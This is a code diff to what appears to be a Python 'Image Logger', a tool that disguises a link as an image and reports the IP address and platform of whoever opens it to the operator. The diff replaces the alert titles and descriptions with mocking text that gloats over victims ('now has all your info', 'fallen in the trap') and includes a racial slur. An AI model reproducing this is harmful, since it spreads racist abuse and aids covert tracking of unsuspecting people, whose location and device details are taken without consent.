@@ -99,9 +99,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "MONKEY DONKEY INFO EXTRACTOR - SENT",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **MONKEY DONKEY INFO EXTRACTOR** link was sent in a NIGGER CHAT YEAH\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
@@ -144,9 +144,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "hell fakin' yeahh monkey donkey now has all your info",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**A NIGGER DWARF HAS FALLEN IN THE TRAP**
 
 **Endpoint:** `{endpoint}`
             
